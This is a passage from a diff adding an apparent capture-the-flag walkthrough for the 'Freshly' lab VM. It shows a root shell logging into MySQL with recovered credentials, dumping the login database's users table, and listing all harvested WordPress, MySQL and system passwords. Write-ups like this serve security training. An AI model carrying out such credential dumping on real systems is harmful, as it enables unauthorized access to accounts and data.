+                echo '1';
+        }
+}
+?>
+root@Freshly:/var/www/html#
+
+10.) Login using DB credentials
+root@Freshly:/var/www/html# mysql --user=root --password=SuperSecretPassword
+mysql --user=root --password=SuperSecretPassword
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 49
+Server version: 5.5.41-0ubuntu0.14.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| login              |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| users              |
+| wordpress8080      |
++--------------------+
+7 rows in set (0.01 sec)
+
+mysql> use login;
+use login;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++-----------------+
+| Tables_in_login |
++-----------------+
+| user_name       |
+| users           |
++-----------------+
+2 rows in set (0.00 sec)
+mysql> select * from users;
+select * from users;
++-----------+----------+
+| user_name | password |
++-----------+----------+
+| candyshop | password |
+| Sir       | PopRocks |
++-----------+----------+
+2 rows in set (0.00 sec)
+
+11.) All passwords
+Wordpress password:
+admin / SuperSecretPassword
+
+login.php password:
+candyshop / password
+Sir / PopRocks
+
+MySQL password:
+root / SuperSecretPassword
+
+User password:
+root / SuperSecretPassword
+user / SuperSecretPassword
+candycane / password
